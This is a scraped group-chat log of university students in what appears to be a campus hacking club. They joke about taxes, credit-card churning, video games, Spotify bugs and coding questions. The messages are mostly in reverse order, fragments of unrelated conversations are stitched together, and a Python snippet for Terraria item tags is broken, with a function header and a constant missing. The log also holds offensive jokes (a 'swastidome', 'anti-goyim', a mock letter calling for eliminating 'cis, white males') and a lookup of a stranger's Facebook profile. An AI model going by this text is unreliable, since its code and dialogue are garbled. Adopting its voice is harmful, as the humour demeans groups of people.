<p>Also looks like 20% + 3.8%</p>
<p>For joint at least</p>
<p>That's only up to a half-milly</p>
<p>that's gotta be a big part of it</p>
<p>so you only get hit at like 15%</p>
<p>it's return on your long-term investments though business or whatever</p>
<p>your income isn't so much a paycheck</p>
<p>but when you're super rich</p>
<p>Like with romney</p>
<p>Which is how you get low effective tax rates</p>
<p>Donating a fuckton to charity</p>
<p>capital gains probably?</p>
<p>what're the big tax loop holes</p>
<p>lol</p>
<p>That's what they get for charging fives during September</p>
<p>Probably spike the murder rate for a year</p>
<p>Good</p>
<p>The turkish cabbies will riot tho</p>
<p>We could finally have useful taxis for the first time ever</p>
<p>If we get uber in bing that would be dank af</p>
<p>cause the cable bill is in his  name and we haven't switched over yet</p>
<p>they call and send mail to my roommate all of the time</p>
<p>Also Uber might final be allowed upstate</p>
<p>Lol that's sad</p>
<p>Also in spanish</p>
<p>They cover entire trains in an ad that just says Time Warner Cable is now Spectrum</p>
<p>Still owned by the same company that owns like a quarter of the media tho right?</p>
<p>Nope</p>
<p>fuck</p>
<p>hear**</p>
<p>DID YOU HERE!?</p>
<p>TIME WARNER CABLE IS NOW SPECTRUM</p>
<p>spectrum**</p>
<p>Well time Warner</p>
<p>We should destroy time Warner cable</p>
<p>so there's def imbalance there</p>
<p>but the top 1% has like 40% of the nations wealth</p>
<p>Probably even more now</p>
<p>The 81st to 100th percentile pay 2/3 of income tax</p>
<p>https://upload.wikimedia.org/wikipedia/commons/e/e0/2010_US_Tax_Liability_by_Income_Group_-_CBO.png</p>
<p>Going to find the chart</p>
<p>Is that hard to track fully?</p>
<p>none of this mitt romney paying 13% income tax</p>
<p>Mehhhhh</p>
<p>right?</p>
<p>then we could end up pretty stable tax-wise</p>
<p>if we remove tax loopholes (which we won't)</p>
<p>Maybe Drumpf will come through and lower taxes for the middle class</p>
<p>I'ma just move to Texas and have no income tax</p>
<p>I probably have to do taxes this year cause I worked the winter and I think I broke through some bracket</p>
<p>Ah true, I think I actually don't pay any federal income tax but new York still took some</p>
<p>things get screwy with deductions and refunds when you're a dependent</p>
<p>probably not because you're likely a dependent of your parents</p>
<p>Well only if they did payroll deductions</p>
<p>So did I lose out on free money last year cause I made like nothing working the summer?</p>
<p>That's why they have those tax refund check expediters at walmart</p>
<p>That's weird</p>
<p>When you're poor af the government gives you money back at tax time</p>
<p>https://en.wikipedia.org/wiki/Income_tax_in_the_United_States#Effective_income_tax_rates</p>
<p>how dat</p>
<p>Your effective tax rate at low low income is negative</p>
<p>is it less than 10k?</p>
<p>Not even</p>
<p>is like 10% tax</p>
<p>so like your first 10k of income</p>
<p>Ah gotcha</p>
<p>that's around the roth cutoff</p>
<p>sorry</p>
<p>117 is wrong</p>
<p>it's not like everything gets womped with more taxes because you   make more</p>
<p>anything you make past 117k is taxed at that  higher rate</p>
<p>so like the top bracket is 117k or something</p>
<p>your taxes are only on the amount past the limit</p>
<p>Traditional is only worth if you're old or you make shit returns in the market</p>
<p>Oh but for traditional doesn't it take from income so you can bump down a tax bracket</p>
<p>you contribute post-tax, essentially take home money</p>
<p>out</p>
<p>Roth is no taxes out or in?</p>
<p>and always backdoor into roth ira</p>
<p>Then your capital gainz don't get taxed when you retire</p>
<p>you can roll into ira</p>
<p>You still pay tax but you subvert the income restriction part</p>
<p>But, you can actually use a loophole to get money into a roth ira</p>
<p>Yeah because you deduct traditional contributions</p>
<p>18k roth contribution is worth "more" than 18k traditional in some sense</p>
<p>Oh and you only need 1k for the stock market thing</p>
<p>Get both</p>
<p>2dank5 1%</p>
<p>there's a reason it has income restrictions</p>
<p>also roth 4 lyfe</p>
<p>Double your money on the stock market ten times with 2000</p>
<p>401k is different</p>
<p>fight!</p>
<p>roth or traditional</p>
<p>Max your 401k every year and wait</p>
<p>be a president</p>
<p>how can I make $1milly</p>

<p>Make yourself critical at Bloomberg then commence shitposting</p>
<p>I miss being able to shitpost in school;</p>
<p>lel</p>
<p>wake me up inside</p>
<p>Longer than we've been alive</p>
<p>they've been here for 12 years</p>
<p>guys it seems like the people next to me are moving</p>
<p>🇲🇽</p>
<p>I like 2k17 takes two extra keystrokes compared to 2017</p>
<p>2k17 already got me like</p>
<p>This is wild</p>
<p>Wat</p>
<p>Why didn't he throw Bloomberg in too?</p>
<p>So this guy spent 6 weeks learning to code and called it an internship at Google and Microsoft?</p>
<p>This world doesn't belong to us</p>
<p>Doesn't look like anything to me</p>
<p>sounds right</p>
<p>So basically they get to visit the company offices</p>
<p>🇲🇽</p>
<p>They did it</p>
<p>They solved it</p>
<p>The skill shortage</p>
<p>is this it?</p>

<p>nah like ask if this kid has ever been in contact with them</p>
<p>this is not a program that exists</p>
<p>Could probably email someone at microsoft and ask</p>
<p>and learn about those ocmpanies</p>
<p>make this game</p>
<p>and said you're interning for google and ms</p>
<p>sat him in a room</p>
<p>these codenow people</p>
<p>i think</p>
<p>that program doesn't exist</p>
<p>his name is antonio bethune</p>
<p>why the fuck is his github chris</p>
<p>He's a ruby dev</p>
<p>https://github.com/Chris46025</p>
<p>found him from this</p>
<p>sounds fishy</p>
<p>this kid is saying he interned at google AND microsoft in the same summer</p>
<p>extensive internship</p>

<p>feels about the 1975?</p>
<p>like league of lesbian</p>
<p>but at least it's not pay to win</p>
<p>If you farm really hard in the right spot, you can get the top ship in a day</p>
<p>but otherwise yeah</p>
<p>there's exploits that make the grinding go really quick</p>
<p>isn't elite just grinding</p>
<p>if you wanna build something ou need the blocks</p>
<p>I want no fun, only grind</p>
<p>same grind as minceraft</p>
<p>Is there grind?</p>
<p>like anti-goyim</p>
<p>they should come up with a word that means you're not a goy</p>
<p>You can be my boss 😉😍</p>
<p>or you can just build and be a goy</p>
<p>terraria has like bosses and stuff</p>
<p>i still think minecraft is more fun</p>
<p>objectively</p>
<p>there's a lot more content</p>
<p>with more emphasis on progression</p>
<p>terraria is basically 2d minecraft</p>
<p>it's like how uber is a startup</p>
<p>o neat</p>
<p>they're independent</p>
<p>they're not owned by anyone else</p>
<p>i only play indie games</p>
<p>yeah</p>
<p>yesh</p>
<p>is that an indie studio</p>
<p>it's this game by Microsoft Co</p>
<p>neat</p>
<p>then you'll love minecraft</p>
<p>yee</p>
<p>do you like crafting</p>
<p>do you like mining</p>
<p>Is terraria worth?</p>
<p>note the swastidome</p>
<p>this is the map around spawn</p>
<p>on terraria</p>
<p>i set up a server for some frineds</p>
<p>D:</p>
<p>no</p>
<p>You need to up those Civ numbers</p>
<p>but</p>
<p>i've been playing terraria recently</p>
<p>http://marvel.com/games/139/marvel_heroes_2016</p>
<p>That would be danko</p>
<p>how dank would that be</p>
<p>and use your powers for stuff</p>
<p>where you can be any of the heroes or villians</p>
<p>there should be a marvel game</p>
<p>I only play paladins champions of the realm</p>
<p>But DotA number 1</p>
<p>I liked hots simplicity</p>
<p>oh so it's like hanky panky dota</p>
<p>There's also no buying items and you level as a team</p>
<p>Oh shit yeah I mixed the two lol</p>
<p>Hots is like Dota but you don't get told to kill yourself nearly as often and people are actually kinda nice</p>
<p>Lol no its not a card game. That's Hearthstone and Hearthstone is a habit worse than heroin</p>
<p>No it's a card game</p>
<p>right</p>
<p>it's just like dota</p>
<p>Can someone play heroes of the Storm with me pls?</p>
<p>Lel</p>
<p>dota is a ripoff</p>
<p>same thing</p>
<p>Or both</p>
<p>Doesn't he play DotA ?</p>
<p>i will smak him 1v1</p>
<p>oO does he</p>
<p>tim plays league</p>

<p>if you can't write the entirety of your python code in one line, you're doing it wrong</p>
<p>That was a nice read</p>
<p>relevant python dev rant: http://stackoverflow.com/questions/1349311/python-string-join-is-faster-than-but-whats-wrong-here</p>
<p>Who also give excellent talks</p>
<p>Or not the BDFL, just a core Python dev</p>
<p>There we go. The BDFL makes an appearance here and says that using join on an actual list is most efficient</p>

<p>https://www.reddit.com/r/news/comments/5m863w/hate_crime_charges_filed_against_4_in_torture_of/</p>
<p>Yee</p>
<p>because strings are just lists</p>
<p>right</p>
<p>You can actually change the join thing to ''.join(map(charToBig, raw.upper()))</p>
<p>am i real monty pythoner now</p>
<p>```python 3
import sys

# Big 0 Statue Item ID offset by ASCII 0

# Big A Statue Item ID offset by ASCII A
CONST_BIG_A = 2712 - ord('A')

  """Return a valid item chat tag format given an ID"""
  return "[i:{}]".format(str(itemID))

def charToBig(c):
  """Convert a char to the string code for an equivalent big letter statue"""
  if c.isdigit():
    return formatTag(ord(c) + CONST_BIG_0)
  if c.isalpha():
    return formatTag(ord(c) + CONST_BIG_A)
  return c

def strToBig(raw):
  """Convert a string to the codes for equivalent big letter statues."""
  return ''.join(charToBig(c) for c in raw.upper())

<p>Psh, could've done it in 5 lines of ruby</p>
<p>example:

python3 convert.py "hi brad"                                                                       [i:2719][i:2720] [i:2713][i:2729][i:2712][i:2715]</p>

<p>can get like 1.9-2.2x redemption rates or something</p>
<p>hyatt transfer is usually worth or something</p>
<p>apparently redeeming points through chase is usually not worth</p>
<p>lol</p>
<p>then in 7 years do it again</p>
<p>sell TVs on ebay and store the money in bitcoins</p>
<p>fuck it, just run up your credit and declare bankruptcy</p>
<p>details galore</p>
<p>this is right up my ally</p>
<p>it's a scheme</p>
<p>meanwhile, make runs on amex, spg, mariott, etc</p>
<p>bop bop bop bop</p>
<p>so you just accumulate 5% points on categories, redeem at 1.25x+ after 2 years</p>
<p>and the freedoms don't have annual fees</p>
<p>so you don't lose those credit lines</p>
<p>but your credit line hasn't closed</p>
<p>and then 2 years after getting those bonuses, you can apply for the card again</p>
<p>boom $2,250 in travel credit</p>
<p>use them to accumulate UR points</p>
<p>Wait if you apply for two at the same time does your score poop the bed harder?</p>
<p>downgrade to freedom and freedom unlimited</p>
<p>instead of 1.25x from preferred</p>
<p>use reserve to redeem at 1.5x</p>
<p>get points</p>
<p>then reserve</p>
<p>is to get prefferred</p>
<p>so the plan</p>
<p>Then cancel the normie card</p>
<p>Since both sign up bonuses stack</p>
<p>Wait, get both</p>
<p>All the normies have them</p>
<p>but first get pointz</p>
<p>I need to up my flex game</p>
<p>yeah</p>
<p>I see everyone with a sapphire preferred</p>
<p>:S</p>
<p>I'm scared of the fee</p>
<p>next time</p>
<p>yeah well</p>
<p>lame</p>
<p>I guess</p>
<p>I'll do that</p>
<p>chase sapphire preferred</p>
<p>ok but</p>
<p>Me_irl</p>
<p>(no I don't)</p>
<p>I have the guts to push an internet button</p>
<p>if I have the guts to walk up to a grill</p>
<p>ye</p>
<p>If you get declined call them up and put Mike on the line</p>

<p>Hey this is Danny Fresh with a fresh pizza tip for you. Do you want to know how to receive a free Domino's one topping pizza from Domino's Pizzeria and Restaurant?Well sit down, let me tell you. Step 1: Telephone a Domino's Pizza Eatery and Restaurant and order a large one topping pizza and the guy will say, "What topping would you like?" And you say, "I'd like my topping to be another steaming hot Domino's one topping pizza." So the guy asks, "What topping would you like on your Domino's one topping pizza topping?" And then you say, "Go ahead and make my second Domino's one topping pizza topping a Domino's one topping pizza." And then the guy will ask, "Ok sir, what topping would you like on your Domino's one topping pizza topping one topping pizza?" And you respond with, "A Domino's one topping pizza." And continue to order Domino's one topping pizza toppings, until you are at a pizza topped with 71 Domino's one topping pizzas, and then the pizza guy will say, "Wait one moment, sir. We don't have any pizza boxes that will fit this 71 Domino's one topping pizza topping pizza." So you say, "Hold on," And quickly run to Home Depot and purchase a Maytag refrigerator which retails for 3,399 US dollars, and when it comes time to pay for the Maytag refrigerator, you offer to pay Home Depot, not with cash, but with 70 piping hot Domino's one topping pizzas, and they of course accept, so you buy the fridge and you take it back to the Domino's Pizzeria Restaurant, you give the pizza guy a Maytag refrigerator box and put the 71 topped Domino's Pizza one topping pizza into that, and then you pay Domino's using a brand new Maytag refrigerator which retails for 3,399 US dollars, so then you take the Maytag refrigerator box filled with a 71 topped Domino's one topping pizza back to Home Depot, and you give it to the cashier there as payment for your brand new Maytag refrigerator which retails for 3,399 US dollars, and when the cashier turns his back to get your receipt, you snatch the 71st Domino's one topping pizza off the top of your Domino's one topping pizza stack and you put it in your pocket, and there you have yourself a completely free steaming hot Domino's one topping pizza!</p>

<p>s would pop up in our feeds that we had talked about. So we all took our phones and sat them down next to Spanish talk radio for about two hours. As we thought we were targeted by Spanish ads for all kinds of things for the next few days.</p>

<p>Yeah I'd say hackbu in general does more than most</p>
<p>Lol</p>
<p>yeah that tanked</p>
<p>oh you meant itai</p>
<p>it could def be argued against. but compared to the astounding incompetence of the other cages? I mean thats our baseline, those are our peers</p>
<p>Ye hackbu is like a little dank pocket of gold</p>
<p>But I'll hush</p>
<p>Ehhhh the productivity could be argued against</p>
<p>i'm writing about hackbu for this assignment for sure</p>
<p>it's not a nice to have, it's mandatory</p>
<p>this makes me MUCH more interested in guarding internal culture than I was before</p>
<p>theres some gnarly math with the distributed altruism/genetics/game theory stuff</p>
<p>when itai was around it was a rare combo of an ultra productive individual that was _also_ benign, so the whole cage just slayed constantly</p>
<p>this reminds me strongly of hackbu veruses many dysfunctional student organizations. we're all very benign and our cage does way more</p>
<p>if you take the most productive individuals then after a few generations theyre completely psycho and literally murder each other to death</p>
<p>apparently no, and EVERYONE breeds by successful cage bc it produces a shit load more eggs, because you're implicitly breeding for cooperativeness and nonaggression</p>
<p>they took hens in farms and kept track of how many eggs they laid and tried to breed better ones. they had a group where they bred by individual and another group by cage. obvs both should work but the individuals productivity is obviously more important than the overall cage which has some low and some high performers right?</p>
<p>anway i'm taking evolution for everyone and the cooperative stuff is really fascinating</p>

<p>algo</p>
<p>Will what are you working on</p>
<p>wtf the first 6 posts in my newsfeed are all alan</p>
<p>tell birmingham university web services I said hi</p>
<p>what are you doing near our school</p>
<p>I have internet already</p>
<p>that's the caller's problem</p>
<p>Bruh you can do better than that; fit it with respect to the other dimensions</p>
<p>typically, with data, you try to fill it with something like the mean of the dimension you're working in, but if this is just for an arbitrary point, idk :/</p>
<p>yeah initialized, defaultly</p>
<p>ah okay</p>
<p>you're filling the arguements with null now?</p>
<p>so for integral types that's just 0</p>
<p>T{} just default constructs whatever is past the original Point</p>
<p>https://gist.github.com/wijagels/5f7df6cda71697d96a9154b37573100b</p>
<p>how are you filling that missing value?</p>
<p>damn mods jumped on me quick</p>
<p>oh crap not allowed to do that</p>
<p>edited</p>
<p>oh that makes sense</p>
<p>how you fill in that dimension is up to you</p>
<p>If I need height, weight, and body fat %, and one data point doesnt have height, you'd need to project that up</p>
<p>well it depends, if youre doing something where you need all your data to be the same dimension, you need to.</p>
<p>yeah would that be dumb?</p>
<p>so, for example, from a 2d point to a 3d point?</p>
<p>some internet person told me I should write a projection function</p>
<p>http://codereview.stackexchange.com/questions/150315/templated-point-class-of-any-dimension</p>
<p>what exactly are you trying to do?</p>
<p>I don't think that will help very much</p>
<p>for orthogonal projections</p>
<p>does a projection into a higher dimension make any sense?</p>
<p>If I could do that I'd just throw money at commissioning my own app</p>
<p>Taking compiled non threaded code and making it compiled...</p>
<p>That'd be hilarious</p>

<p>Crass and bored ain't bad</p>
<p>You could do stream of consciousness a la Kerouac</p>
<p>Write this shit:

"it's pretty easy to get a 1.5% cash-back card
and citi double cash is not that hard either
and that's 2% cash back
anyway
what I really came to rant about
is the chinese place that's near me that I like just raised dinner combos from 9.25 to $10
and the side soup from $.75 extra to $1
so it's a double whammy
but at least my sim came
so there's that
mintsim.com"

But with more words and grammar and musings</p>
<p>I like "Crass &amp; Bored" because that's what you are</p>
<p>"The Crass Creed"</p>
<p>"Views from the Crass"</p>

<p>mintsim.com</p>

<p>so it's a double whammy</p>
<p>and the side soup from $.75 extra to $1</p>
<p>is the chinese place that's near me that I like just raised dinner combos from 9.25 to $10</p>
<p>what I really came to rant about</p>
<p>anyway</p>
<p>and that's 2% cash back</p>
<p>and citi double cash is not that hard either</p>
<p>it's pretty easy to get a 1.5% cash-back card</p>
<p>That's why I'd use it</p>
<p>Pretty card</p>
<p>who has a bad credit score that's going to spend more than 50k/yr on a card</p>
<p>With a large market</p>
<p>That seems like an extremely compelling reason</p>

<p>there's literally no reason to use it</p>

<p>I'm not bribing anyone, I don't even have any cash</p>
<p>I called them and asked if they could come early, and their response was "Oh I can come right now if you want"</p>
<p>It's because they're easy to bribe</p>
<p>For some reason this trash company has great reviews</p>
<p>now bribe the trash guy</p>
<p>1% lyfe reeeeeee</p>
<p>They even apologized</p>
<p>No questions asked</p>

<p>hackBU meetup at harveys</p>
<p>when are his hours jack?</p>
<p>i am an arm processor and I feel threatened</p>
<p>"Harvey, I am very concerned about my safety on campus as a self-identifying Intel® Core™ i5-6400 2.7GHz 6MB Smart Cache Box*. Being a part of the 6th Generation Intel® Core™ i5 processors with 4 cores and a 6MB cache, I do not fit into the binary gender system as perpetrated by the patriarchal society that we currently have instituted on campus. My fellow people apart of the Intel® Core™ family do not feel safe on campus and would like propose the following be enacted on campus immediately. First, we want to have 50% all students and faculty to be self-identified Intel® Core™ processors by the year 2020. Secondly, we want all forms and documents originating from the university to contain check boxes for all processors from the Intel® Core™family. (Please see this link for a full list of what we demand be on all forms: http://www.intel.com/buy/us/en/catalog/components/boxedprocessors/6th-generation-intel-core-i7/sort,onmarket-d/page,1/1060/1059). Lastly, we want all cis, white males to be eliminated from campus.  Thank you for you understand and we look forward to promoting equality on this bigoted campus with you.

Best,</p>

<p>The application Pulse is an platform for for organizations and people to find and create events or plans in a community. The Pulse team consists on Steve Popovich, Jesse Pelzar, Chloe Long, Adam Gluck, and Michael Correale. We currently have over 1000 users and growing solely from Binghamton University.

<p>That was the only sentence about african americans in the 'tar-and-feathering' wikipedia page lol</p>
<p>But tar and feathering is just a thing you think of sam adams doing to tax collectors</p>
<p>If he said lynching, okay that's a different story</p>
<p>maybe they were referring to british americans when they said minorities</p>
<p>"According to William Harris, this was a relatively rare form of mob punishment to Republican African-Americans in the post-bellum U.S. South, as its goal was typically pain and humiliation rather than death."</p>
<p>It's black face</p>
<p>I'm confused, didn't tar and feathering disproportionately affect white people?</p>
<p>u can spank me l8r</p>
<p>smh at this hoe</p>
<p>the comment was on the editorial, not the news story</p>
<p>Aww it's ok tho</p>
<p>for raising a false alarm</p>
<p>i am sorry</p>
<p>everyone</p>
<p>WOW I AM SO STUPID</p>
<p>I noticed the comment block almost immediately, but did not check the contents of the article for the original</p>
<p>when did you comment?</p>
<p>Because it was a real time story I think it might've gone to print after</p>
<p>It doesn't appear to be in print</p>
<p>:OOOOOOOOOOOOO</p>
<p>The paper copies?</p>
<p>Hundreds express dissatisfaction at student congress</p>
<p>fuck archive doesnt have it</p>

<p>let's see</p>

<p>do you have proof that they deleted it?</p>

<p>like what more did you want from the guy</p>
<p>in the pipe dream article about the tar and feathering i wrote a comment saying "His quick resignation left no sense of accountability" is absolutely ridiculous</p>

<p>Except for your mom haHAA GOTEEM</p>
<p>Nothing is random Ethan</p>
<p>Me too cause I swear shuffle isnt random</p>
<p>Also I wanna see more analytics on my listening behaviors</p>
<p>Ooooh yeah they make it so annoying to manipulate playlists</p>
<p>I have to navigate to my playlist and scroll down until I find it to remove it</p>
<p>It's ass that if I'm listening to an album on Android and I realize I hate the current song, I can't just remove on the play screen</p>
<p>Speed</p>
<p>My iOS Spotify app is shit. Album art wrong half the time, artist name and song wrong somrtimes. Occasionally I'll load in play a song and then a minute later it plays the song I was playing before the app last shut down. Also after watching a video sometimes my music runs at 2x spees</p>
<p>It's because they're filthy swedes</p>
<p>And it's amazing that is been this way for this many years</p>
<p>But Spotify is completely garbage</p>
<p>Google play is flawless</p>
<p>Spotify is flawless</p>
<p>Nobody else seems to have issues making web players</p>
<p>It's slow, it crashes all of the time</p>
<p>And the web app is horrendous</p>
<p>A music player</p>
<p>Spotify has one product</p>
<p>Yes</p>
<p>Is it me or is Spotify super buggy</p>

<p>lay off the pornog kiddo</p>
<p>Yeah that's pretty bad</p>
<p>smh at Aiden :(</p>
<p>lol no this is a totally theoretical idea.  Says x and y were lists, and instead of x = x + 1 i was appending some element and checking if they were the same list</p>
<p>just what are you doing</p>
<p>pls no more x-y problem</p>
<p>if you're using ints you can make it more efficient</p>
<p>ooooh ya dun fucked up</p>
<p>if x == y</p>
<p>say you're just comparing ints</p>
<p>@erik what is y</p>

    break
  x = x + 1</p>
<p>This: while True:
  if x is y:
    break
  else:
    x = x + 1</p>

<p>Sanic is also a meme tho</p>
<p>Crass y u never snapchat me</p>
<p>Yea basically</p>
<p>yes</p>
<p>is this sanic thing just a faster flask essentially</p>
<p>aw ;3</p>
<p>crass, youre such a handsome boy with your new haircut :)</p>
<p>That's pretty nice</p>
<p>Ooooooooooooo</p>
<p>Even that would be minimally better at best</p>
<p>If not I think you're fine</p>
<p>And check if either are in the header</p>
<p>cookies = SimpleCookie()
                 cookies.load(self.headers[**put terniary giving C or c here**])

Is that allowed in Python? Cause I think it's Gucci in c</p>
<p>yea that page cuts off the code sorry</p>
<p>Oh wait you're checking if cookie in there at all nvm</p>
<p>I think that's what you want</p>
<p>True the second if is pointless tho cause there will always be a Cookie in there after the first if</p>
<p>but then which do we use in
cookies.load(self.headers['Cookie'])</p>
<p>If Cookie or cookie in header?</p>
<p>O</p>
<p>harder to read though?</p>
<p>yea i suppose that would be one line</p>
<p>yeah you can do an inline if else,
x = 1 if False else 2</p>
<p>Does Python have terniaries?</p>
<p>roast me</p>
<p>https://github.com/channelcat/sanic/pull/173/files</p>
<p>y is an associative array</p>
<p>might do 
y[x1] = y.pop(x2) if x2 in y
and avoid duplicated code?</p>
<p>what is y</p>
<p>without the code looking like it was written by a 14 year old</p>
<p>is there any elegant way to do that</p>
<p>i need to support an x2 as well</p>
<p>if x1 in y:
    do some constant stuff
    do stuff relating x1 and y
else
    z</p>
<p>someone smarter than me give me some advice here</p>

<p>Guys what memes should I make</p>
<p>Whew I was almost feeling bad for them</p>
<p>he was in my theater class last semester</p>
<p>http://1tron1.github.io/Civet/</p>
<p>one does</p>
<p>does this kid go to bing</p>
<p>At the end of the survey it says keep up to date by visiting our website</p>
<p>He hasn't responded since I sent him the new feedback</p>
<p>sorry this website is only making me cringe</p>
<p>lol david it's ok</p>
<p>wow i just realized that i put lol in front of nearly every message i just send</p>
<p>Can't wait to be old so I can be a dick w/o consequences</p>
<p>LOL</p>
<p>lol nah i sent him what cras said</p>
<p>Are you kidding</p>
<p>We're not adding them to chat</p>
<p>So should we compile this togeather and email it or just add em to the chat for a bit</p>
<p>lol</p>
<p>And from the image I can tell that's a durable tablet</p>
<p>I'm mean hey 4x the ports of the MacBook pro</p>
<p>"Enhance"</p>
<p>LOL it is run on a pi</p>
<p>I could zoom in on the freaking background of the thumbnail head shots on my phone</p>
<p>"I get products shipped and look good doing it. They call me the eliminator because if there's an order that needs shipping," what the even fuck</p>
<p>should i kms</p>
<p>how did I miss that</p>
<p>oh duh</p>
<p>"I am the founder and chief hardware and software product developer at BluCloud. At BluCloud our we believe in affordable access to excellent technology, you know, like any of our products for example. "</p>
<p>isn't it clear</p>
<p>not sure I even understand what they're doing this for</p>
<p>"they call me the eliminator"</p>
<p>also what's the goal here</p>
<p>http://1tron1.github.io/Civet/team/index.html worst headshots 2016</p>
<p>lol i just saw the duck duck go part</p>
<p>likely running bloat</p>
<p>it's literally just a raspberry pi</p>
<p>duck duck go is  literally unusable</p>
<p>but mostly too much</p>
<p>I think the colors are sorta close</p>
<p>the fact that I can't skip that intro screen is beyond frustrating</p>
<p>the horizontal breaks make me want to barf</p>
<p>even better</p>
<p>jpegs too</p>
<p>makes my page take 3 seconds to load</p>
<p>that's essential</p>
<p>well I love all of the hilariously large image sizes</p>
<p>And there's a Google form somewhere in the demo</p>
<p>He said that he was full stack</p>
<p>I'm not sure what  I'm supposed to be giving feedback on</p>
<p>or what</p>
<p>or everything</p>
<p>did he just make that loady screen</p>
<p>no like</p>
<p>It seems like a chrome book play. He says they put together cheap hardware too and load this as the default home screen and lock the browser in full screen</p>
<p>what  exactly did he make</p>
<p>Dopeeeee</p>
<p>wwow</p>
<p>w</p>
<p>He asked for feedback</p>

<p>Business must be good he spends all his time writing essays for Facebook</p>
<p>This is the worst line</p>
<p>"when you start you're not going to be making money. I don't even make money. But it's good because it means I have less things!</p>

<p>Which is a terrible combination</p>
<p>Or really just speaking</p>
<p>I was literally talking to Ethan about this yesterday, I got over fear of public speaking before I getting decent at public speaking</p>
<p>Erik at 0:37 in the news clip is probably my favorite</p>
<p>but I have not</p>
<p>lol</p>
<p>dong</p>
<p>Anyone have Dong, Junyi as a professor before?</p>
<p>close but not cigar</p>
<p>then all the symmetric would be nice</p>
<p>if only that phil could be on tuesday from 1140 to 105</p>

<p>a lot of bitcoin is r/explainlikeimphd</p>
<p>that irony has crossed my mind for sure</p>
<p>I like this description of bitcoin</p>
<p>"It does seem a little weird that a currency whose central feature is that it creates an immutable auditable public record of all transactions ever became popular for buying drugs? I mean, "each Bitcoin user has an address, made up of letters and numbers, and the authorities are often able to link an address to a real person using sophisticated data analysis." And then they've got all your transactions. I suppose the drug dealers are no different from the big banks in this regard, using blockchain technology not so much because it is well suited to their particular needs but just because it has a general aura of coolness around it.

<p>Maple incorporates a dynamically typed imperative-style programming language which resembles Pascal.[2] The language permits variables of lexical scope. There are also interfaces to other languages (C, C#, Fortran, Java, MATLAB, and Visual Basic). There is also an interface to Excel.</p>

<p>Math 356 -- Mathematical Modeling
Spring 2009
MWF 9:40-10:40 in LN G335
Tue 10:05-11:30 in FA209
      This course is about developing mathematical models (for instance, systems of equations) to describe real-world phenomena. For instance, one might model the populations of various species in an ecosystem, or determine optimal treatment planning for gamma-knife surgery, or compare the effectiveness of various strategies to fend off a zombie attack.

Click here for a brief introduction to modeling.

To get a sense for the subject from examples, you might try checking out past problems from the Mathematical Contest in Modeling.

This course will have fewer self-contained proofs and calculations than a typical math class and more extended, open-ended problems. In fact, rather than a final exam, there will be a term project, to be done in groups, culminating in an in-class presentation and a 15-20 page paper. For this project you will model a real-world situation of your own choosing. Click here for examples of projects from a previous semester. There will also be homework (approximately weekly) and two midterm exams. Some of the homework will involve programming in Maple, but no programming experience is required. The text for the class is A first course in Mathematical Modeling, by Giordano, Weir, and Fox. Either the third or fourth edition is fine.</p>
<p>Aww that is awesome</p>
<p>MATH 356, MATHEMATICAL MODELING

Mathematical structures that allow people to describe and discuss naturally occurring phenomena. Possible topics include functions as models, recurrence relations, networks and graph theory, linear programming, discrete probability models, Markov chains, Monte Carlo simulations, random walks, queuing theory, recursive game theory. For each topic, we will discuss the mathematics rigorously and then analyze some real-world applications. Prerequisites: MATH 304 and either MATH 314 or MATH 330. spring only</p>
<p>What was it?</p>
<p>Let's space em out</p>
<p>I will absolutely try</p>
<p>Y'all can try</p>
<p>what if we all email him - then he'd have to offer the course, no?</p>
<p>Damn</p>
<p>That's so sad</p>
<p>super sad :(</p>
<p>yeah tim i went through that sad realization a couple weeks ago</p>
<p>It doesn't exist anymore</p>
<p>Its in the course bulletin, idk how often its offered</p>
<p>does anyone know if MATH 356 even exists</p>
<p>haha nice meme</p>
<p>I hope ken doesn't notice</p>
<p>I'm tattooing a cheat sheet to my arm</p>
<p>Everything before inheritance</p>
<p>Lol no idea</p>
<p>Erik what's on the oop midterm</p>
<p>Yeah same</p>
<p>I thought that was the white stuff</p>
<p>"bap sauce"</p>
<p>Wat is it</p>
<p>New chicken bap sauce</p>
<p>Sewag he's gonna recruit u!!</p>
<p>Not me</p>
<p>CREEEEIIIIINGE</p>
<p>wtf</p>
<p>this person comes up when searching the number</p>
<p>https://www.facebook.com/hudson.jordan.73</p>
<p>He's from Poughkeepsie</p>
<p>Taylor</p>
<p>brb, writing a gui in visual basic to track this person</p>
<p>someone might be trying to murder me</p>
<p>It's Poughkeepsie</p>
<p>I think he's in that 845</p>
<p>Gotta be Chris</p>
<p>which one of you is this</p>
<p>Is Gabe making you watch mukbang</p>
<p>New filthy Frank vid today</p>
<p>I get the Chinese banana eating streams but not this</p>
<p>What's the incentive to watch these?</p>
<p>If anything</p>
<p>I expected the enema tutorial</p>
<p>I completely did not expect this from you</p>
<p>and he's super awk</p>
<p>that's what a mukbang is</p>
<p>they just eat a lot of food</p>
<p>Chris explain pls</p>
<p>This is what you guys should actually watch 
https://youtu.be/xhBUgo4N3oo</p>
<p>Wut</p>
<p>that sound thing</p>
<p>Actually wat</p>
<p>it doesn't work for me</p>
<p>Wat</p>
<p>https://www.youtube.com/watch?v=4Khk96Gjs2s</p>
<p>everyone should watch this</p>
<p>pretty pointless, basically just a pure math thing but still cool</p>
<p>you can see how like hooks loop back and bridges have different features etc</p>
<p>you can drag it and its really cool, it does feature extraction on the sound and projects it down to three or four dimensions</p>
<p>http://www.loopditty.net/</p>
<p>a phd student erik and i worked with made this thing</p>
<p>That's because it's in Spanish</p>
<p>also that guy's c++ is basically unreadable  to me</p>
<p>but the divide-and-conquer approach is the fastest for the one-off search, as erik said with a heap</p>
<p>if you're finding the closest set of points to a set of points, a quadtree is probably more fitting</p>
<p>k-d tree is cool, but unfit</p>
<p>I should write a jvm and call it the JJVM</p>
<p>I just thought of the best idea</p>
<p>That's what binghamton needs</p>
<p>🇵🇱</p>
<p>this university is next to a mattress farm as you can see</p>
<p>Long live Español computer science</p>
<p>Damn this is fancy</p>
<p>nvm, fuck this guy he uses tabs</p>
<p>This guy did it with c++</p>
<p>https://github.com/jlblancoc/nanoflann</p>
<p>Woah</p>
<p>Constructing this seems to take O(n log n) and nearest neighbor search takes O(log n) so this would work</p>
<p>https://en.wikipedia.org/wiki/K-d_tree</p>
<p>Or you may be able to also say it should be d(n log_2 n) since it sorts each dimension</p>
<p>so for small values of m, the trivial solution would outrun it</p>
<p>n log_2 n + m log_2 n &lt;= m * n from m=0 to m=30 from n=0 to n=30</p>
<p>That's assuming that once you have the sorted stuff it only takes you log n attempts to figure out which one is closest</p>
<p>Yeah, if you went ahead and sorted it, then you're dealing with O(n log n) + O(m log n)</p>
